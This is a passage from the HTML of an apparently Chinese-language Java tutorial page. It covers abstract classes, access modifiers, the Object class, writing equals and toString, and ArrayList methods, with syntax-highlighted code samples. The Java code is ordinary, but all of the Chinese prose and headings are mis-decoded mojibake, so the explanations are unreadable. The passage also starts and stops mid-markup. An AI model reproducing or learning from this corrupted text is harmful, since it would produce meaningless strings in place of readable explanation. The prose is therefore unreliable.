punctuation">&#125;</span></code></pre><p>æ‰€ä»¥å¾ˆæ˜æ˜¾è¿™æ˜¯è¿›å…¥ä¸äº†<code>if</code>çš„ã€‚</p><ul><li>åªèƒ½åœ¨ç»§æ‰¿å±‚æ¬¡å†…è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</li><li>åœ¨å°†è¶…ç±»å¼ºåˆ¶è½¬æ¢æˆå­ç±»ä¹‹å‰ï¼Œåº”è¯¥ä½¿ç”¨<code>instanceof</code>è¿›è¡Œæ£€æŸ¥</li></ul><p><strong>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæœ€å¥½å°½é‡å°‘ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢å’Œ<code>instanceof</code>è¿ç®—ç¬¦</strong></p><h4 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h4><p>ä¸ºäº†æé«˜ç¨‹åºçš„æ¸…æ™°åº¦ï¼ŒåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŠ½è±¡æ–¹æ³•çš„ç±»æœ¬èº«å¿…é¡»è¢«å£°æ˜ä¸º<strong>æŠ½è±¡</strong>çš„ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>é™¤äº†æŠ½è±¡æ–¹æ³•ä¹‹å¤–ï¼ŒæŠ½è±¡ç±»è¿˜å¯ä»¥åŒ…å«å­—æ®µå’Œå…·ä½“æ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>æœ‰äº›ç¨‹åºå‘˜è®¤ä¸ºï¼Œåœ¨æŠ½è±¡ç±»ä¸­ä¸èƒ½åŒ…å«å…·ä½“æ–¹æ³•ï¼Œã€‚å»ºè®®å°½é‡å°†é€šç”¨çš„å­—æ®µå’Œæ–¹æ³•ï¼ˆä¸ç®¡æ˜¯å¦æ˜¯æŠ½è±¡çš„ï¼‰æ”¾åœ¨è¶…ç±»ï¼ˆä¸ç®¡æ˜¯å¦æ˜¯æŠ½è±¡ç±»ï¼‰ä¸­ã€‚</p></blockquote><p>æ‹“å±•æŠ½è±¡ç±»å¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€ç§æ˜¯åœ¨å­ç±»ä¸­ä¿ç•™æŠ½è±¡ç±»çš„éƒ¨åˆ†æˆ–æ‰€æœ‰æŠ½è±¡æ–¹æ³•ä»æœªå®šä¹‰ï¼Œè¿™æ ·å°±å¿…é¡»å°†å­ç±»ä¹Ÿæ ‡è®°ä¸ºæŠ½è±¡ç±»ï¼›å¦ä¸€ç§åšæ³•æ˜¯å®šä¹‰å…¨éƒ¨æ–¹æ³•ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå­ç±»å°±ä¸æ˜¯æŠ½è±¡çš„äº†ã€‚</p><p>å³ä½¿ä¸å«æŠ½è±¡æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å°†ç±»å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚</p><p><strong>æŠ½è±¡ç±»ä¸èƒ½å®ä¾‹åŒ–ã€‚</strong>ä½†æ˜¯å¯ä»¥å®šä¹‰ä¸€ä¸ªæŠ½è±¡ç±»çš„æˆå‘˜å˜é‡ï¼Œä½†æ˜¯è¿™æ ·ä¸€ä¸ªå˜é‡åªèƒ½å¼•ç”¨éæŠ½è±¡å­ç±»çš„å¯¹è±¡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="å—ä¿æŠ¤è®¿é—®"><a href="#å—ä¿æŠ¤è®¿é—®" class="headerlink" title="å—ä¿æŠ¤è®¿é—®"></a>å—ä¿æŠ¤è®¿é—®</h3><p>åœ¨Javaä¸­ï¼Œä¿æŠ¤å­—æ®µåªèƒ½ç”±åŒä¸€ä¸ªåŒ…ä¸­çš„ç±»è®¿é—®ã€‚</p><ol><li>ä»…å¯¹æœ¬ç±»å¯è§ï¼šprivate</li><li>å¯¹å¤–éƒ¨å®Œå…¨å¯è§ï¼špublic</li><li>å¯¹æœ¬åŒ…å’Œæ‰€æœ‰å­ç±»å¯è§ï¼šprotected</li><li>å¯¹æœ¬åŒ…å¯è§ï¼šé»˜è®¤ï¼ˆå¾ˆé—æ†¾ï¼‰ï¼Œä¸éœ€è¦ä¿®é¥°ç¬¦</li></ol><h4 id="Objectï¼šæ‰€æœ‰ç±»çš„è¶…ç±»"><a href="#Objectï¼šæ‰€æœ‰ç±»çš„è¶…ç±»" class="headerlink" title="Objectï¼šæ‰€æœ‰ç±»çš„è¶…ç±»"></a>Objectï¼šæ‰€æœ‰ç±»çš„è¶…ç±»</h4><p>å¯ä»¥ä½¿ç”¨<code>Object</code>ç±»å‹çš„å˜é‡å¼•ç”¨ä»»ä½•ç±»å‹çš„å¯¹è±¡ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>Object</code>ç±»å‹çš„å˜é‡åªèƒ½ç”¨äºä½œä¸ºå„ç§å€¼å¾—ä¸€ä¸ªæ³›å‹å®¹å™¨ã€‚è¦æƒ³å¯¹å…¶ä¸­å¾—å†…å®¹è¿›è¡Œå…·ä½“çš„æ“ä½œï¼Œè¿˜éœ€è¦æ¸…æ¥šå¯¹è±¡çš„åŸå§‹ç±»å‹ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼›</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Manager</span> feng <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åœ¨Javaä¸­ï¼Œåªæœ‰åŸºæœ¬ç±»å‹ä¸æ˜¯å¯¹è±¡ï¼Œä¾‹å¦‚æ•°å€¼ã€å­—ç¬¦ã€å¸ƒå°”ç±»å‹ç­‰éƒ½ä¸æ˜¯å¯¹è±¡ã€‚</p><h4 id="equalsæ–¹æ³•"><a href="#equalsæ–¹æ³•" class="headerlink" title="equalsæ–¹æ³•"></a>equalsæ–¹æ³•</h4><p><code>Object</code>ç±»ä¸­çš„<code>equals</code>æ–¹æ³•ç”¨äºæ£€æµ‹ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ç­‰äºå¦å¤–ä¸€ä¸ªå¯¹è±¡ã€‚</p><p>ä¾‹å¦‚Employeeç±»å®ç°ä¸€ä¸ª<code>equals</code>æ–¹æ³•ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> otherObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> otherObject<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>otherObject <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> otherObject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token class-name">Employee</span> other <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> otherObject<span class="token punctuation">;</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>other<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span>salary <span class="token operator">==</span> other<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>other<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>getClass</code>æ–¹æ³•å°†è¿”å›ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ã€‚</p><blockquote><p>Returns the runtime class of this <code>Object</code>. The returned <code>Class</code> object is the object that is locked by <code>static synchronized</code> methods of the represented class.</p></blockquote><p>ä¸ºäº†é˜²å¤‡nameå¯èƒ½ä¸ºnullçš„æƒ…å†µï¼Œéœ€è¦ä½¿ç”¨<code>Objects.equals</code>æ–¹æ³•ã€‚å¦‚æœä¸¤ä¸ªå‚æ•°éƒ½ä¸ºnullï¼Œåˆ™<code>Objects.equals(a,b)</code>è°ƒç”¨å°†è¿”å›trueã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›falseï¼›å¦åˆ™ï¼Œå¦‚æœä¸¤ä¸ªå‚æ•°éƒ½ä¸ä¸ºnullï¼Œåˆ™è°ƒç”¨<code>a.equals(b)</code>ã€‚</p><p>å®Œç¾çš„<code>equals</code>æ–¹æ³•çš„å»ºè®®ï¼š</p><ol><li>æ˜¾å¼å‚æ•°å‘½åä¸ºotherObjectï¼Œç¨åéœ€è¦å°†å®ƒå¼ºåˆ¶è½¬æ¢ä¸ºå¦ä¸€ä¸ªåä¸ºotherçš„å˜é‡ã€‚</li><li>æ£€æµ‹thisä¸<code>otherObject</code>æ˜¯å¦ç›¸ç­‰ï¼š<br><code>if(this == otherObject) return true;</code></li><li>æ£€æµ‹<code>otherObject</code>æ˜¯å¦ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œè¿”å›falseã€‚è¿™é¡¹æ£€æµ‹æ˜¯å¾ˆå¿…è¦çš„ã€‚<br><code>if(otherObject == null) return false;</code></li><li>æ¯”è¾ƒthisä¸<code>otherObject</code>çš„ç±»ã€‚å¦‚æœ<code>equals</code>çš„è¯­ä¹‰å¯ä»¥åœ¨å­ç±»ä¸­æ”¹å˜ï¼Œé‚£å°±ä½¿ç”¨<code>getClass</code>æ£€æµ‹ï¼š<br><code>if(getClass() != otherObject.getClass()) return false;</code><br>å¦‚æœæ‰€æœ‰çš„å­ç±»éƒ½æœ‰ç›¸åŒçš„ç›¸ç­‰æ€§è¯­ä¹‰ï¼Œå¯ä»¥ä½¿ç”¨<code>instanceof</code>æ£€æµ‹ï¼š<br><code>if(!(otherObject instanceof ClassName)) return false;</code></li><li>å°†<code>otherObject</code>å¼ºåˆ¶è½¬æ¢ä¸ºç›¸åº”ç±»ç±»å‹çš„å˜é‡ï¼š<br><code>ClassName other = (ClassName) otherObject;</code></li><li>æ ¹æ®ç›¸ç­‰æ€§æ¦‚å¿µçš„è¦æ±‚æ¥æ¯”è¾ƒå­—æ®µã€‚ä½¿ç”¨<code>==</code>æ¯”è¾ƒåŸºæœ¬ç±»å‹å­—æ®µï¼Œä½¿ç”¨<code>Objects.equals</code>æ¯”è¾ƒå¯¹è±¡å­—æ®µã€‚å¦‚æœæ‰€æœ‰çš„å­—æ®µéƒ½åŒ¹é…ï¼Œå°±è¿”å›trueï¼›å¦åˆ™è¿”å›falseã€‚<br>å¦‚æœåœ¨å­ç±»ä¸­é‡æ–°å®šä¹‰<code>equals</code>ï¼Œå°±è¦åœ¨å…¶ä¸­åŒ…å«ä¸€ä¸ª<code>super.equals(other)</code>çš„è°ƒç”¨ã€‚</li></ol><blockquote><p>å¯¹äºæ•°ç»„ç±»å‹çš„å­—æ®µï¼Œå¯ä»¥ä½¿ç”¨é™æ€çš„<code>Arrays.equals</code>æ–¹æ³•æ£€æµ‹ç›¸åº”çš„æ•°ç»„å…ƒç´ æ˜¯å¦ç›¸ç­‰ã€‚</p></blockquote><p>å¯ä»¥ä½¿ç”¨<code>@Override</code>æ ‡è®°è¦è¦†ç›–è¶…ç±»æ–¹æ³•çš„é‚£äº›å­ç±»æ–¹æ³•ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> otherObject<span class="token punctuation">)</span></code></pre><p>å¦‚æœå‡ºç°äº†é”™è¯¯ï¼Œå¹¶ä¸”æ­£åœ¨å®šä¹‰ä¸€ä¸ªæ–°æ–¹æ³•ï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥å‘Šä¸€ä¸ªé”™è¯¯ã€‚</p><p>ä¾‹å¦‚è¿™æ ·ï¼Œå¹¶æ²¡æœ‰è¦†ç›–<code>Object</code>ç±»çš„<code>equals</code>æ–¹æ³•ï¼Œå› æ­¤ä¼šæŠ¥å‘Šé”™è¯¯ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> otherObject<span class="token punctuation">)</span></code></pre><h4 id="toStringæ–¹æ³•"><a href="#toStringæ–¹æ³•" class="headerlink" title="toStringæ–¹æ³•"></a><code>toString</code>æ–¹æ³•</h4><p>è¿”å›è¡¨ç¤ºå¯¹è±¡å€¼çš„ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>åªè¦å¯¹è±¡ä¸ä¸€ä¸ªå­—ç¬¦ä¸²é€šè¿‡æ“ä½œç¬¦ â€œ+â€è¿æ¥èµ·æ¥ï¼ŒJavaç¼–è¯‘å™¨å°±ä¼šè‡ªåŠ¨åœ°è°ƒç”¨<code>toString</code>æ–¹æ³•æ¥è·å¾—è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²æè¿°ã€‚</p><blockquote><p>å¯ä»¥ä¸å†™ä¸º<code>x.toString()</code>ï¼Œè€Œå†™ä½œ<code>&quot;&quot;+x</code>ã€‚ä¸<code>toString</code>ä¸åŒçš„æ˜¯ï¼Œå³ä½¿xæ˜¯åŸºæœ¬ç±»å‹ï¼Œè¿™æ¡è¯­å¥ç…§æ ·èƒ½å¤Ÿæ‰§è¡Œã€‚</p></blockquote><p>æ‰“å°æ•°ç»„åˆ©ç”¨<code>Arrays.toString</code>ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="æ³›å‹æ•°ç»„åˆ—è¡¨"><a href="#æ³›å‹æ•°ç»„åˆ—è¡¨" class="headerlink" title="æ³›å‹æ•°ç»„åˆ—è¡¨"></a>æ³›å‹æ•°ç»„åˆ—è¡¨</h3><p><code>ArrayList</code>æ˜¯ä¸€ä¸ªæœ‰ç±»å‹å‚æ•°çš„æ³›å‹ç±»ã€‚ä¸ºäº†æŒ‡å®šæ•°ç»„åˆ—è¡¨ä¿å­˜çš„å…ƒç´ å¯¹è±¡çš„ç±»å‹ï¼Œéœ€è¦ç”¨ä¸€å¯¹å°–æ‹¬å·å°†ç±»åæ‹¬èµ·æ¥è¿½åŠ åˆ°<code>ArrayList</code>åé¢ï¼Œä¾‹å¦‚<code>ArrayList&lt;Integer&gt;</code>ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> staff3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æœ€å¥½ä½¿ç”¨varå…³é”®å­—ä»¥é¿å…é‡å¤å†™ç±»åï¼›å¦‚æœæ²¡æœ‰ä½¿ç”¨varå…³é”®å­—ï¼Œå¯ä»¥çœå»å³è¾¹çš„ç±»å‹å‚æ•°ã€‚ï¼ˆè±å½¢è¯­æ³•ï¼‰</p><p>å½“ç„¶è¿˜å¯ä»¥æŠŠåˆå§‹å®¹é‡ä¼ é€’ç»™<code>ArrayListæ„é€ å™¨</code>ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>æ•°ç»„åˆ—è¡¨çš„å®¹é‡ä¸æ•°ç»„çš„å¤§å°æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„åŒºåˆ«ã€‚å¦‚æœåˆ†é…ä¸€ä¸ªæœ‰100ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œæ•°ç»„å°±æœ‰100ä¸ªç©ºä½ç½®å¯ä»¥ä½¿ç”¨ã€‚è€Œå®¹é‡ä¸º100ä¸ªå…ƒç´ çš„æ•°ç»„åˆ—è¡¨åªæ˜¯<strong>å¯èƒ½</strong>ä¿å­˜100ä¸ªå…ƒç´ ã€‚ä½†æ˜¯åœ¨æœ€åˆï¼Œç”šè‡³å®Œæˆåˆå§‹åŒ–æ„é€ ä¹‹åï¼Œæ•°ç»„åˆ—è¡¨ä¸åŒ…å«ä»»ä½•å…ƒç´ ã€‚</p></blockquote><p>ä½¿ç”¨<strong>add</strong>æ–¹æ³•å¯ä»¥å°†å…ƒç´ æ·»åŠ åˆ°æ•°ç»„åˆ—è¡¨ä¸­ã€‚å¦‚æœéœ€è¦åœ¨æ•°ç»„åˆ—è¡¨çš„ä¸­é—´æ’å…¥å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨addæ–¹æ³•å¹¶æä¾›ä¸€ä¸ªç´¢å¼•å‚æ•°ã€‚</p><p>è¦è®¾ç½®ç¬¬iä¸ªå…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨<code>set</code>ã€‚</p><p>è¦å¾—åˆ°æ•°ç»„åˆ—è¡¨çš„å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨<code>get</code>ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//feng</span>staff<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"hhh"</span><span class="token punctuation">,</span><span class="token number">3456</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//hhh</span></code></pre><blockquote><p>åªæœ‰å½“æ•°ç»„åˆ—è¡¨çš„å¤§å°å¤§äºiæ—¶ï¼Œæ‰èƒ½å¤Ÿè°ƒç”¨<code>list.set(i,x)</code>ã€‚setæ–¹æ³•åªæ˜¯ç”¨æ¥æ›¿æ¢æ•°ç»„ä¸­å·²ç»åŠ å…¥çš„å…ƒç´ ã€‚</p></blockquote><p>sizeæ–¹æ³•å°†è¿”å›æ•°ç»„åˆ—è¡¨ä¸­åŒ…å«çš„<strong>å®é™…å…ƒç´ ä¸ªæ•°</strong>ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span></code></pre><p><code>remove</code>æ–¹æ³•å¯ä»¥ä»æ•°ç»„åˆ—è¡¨ä¸­é—´åˆ é™¤ä¸€ä¸ªå…ƒç´ ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span><span class="token class-name">Employee</span> e <span class="token operator">=</span> staff<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//feng</span></code></pre><p>å¯ä»¥ä½¿ç”¨<code>for each</code>å¾ªç¯éå†æ•°ç»„åˆ—è¡¨çš„å†…å®¹ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token 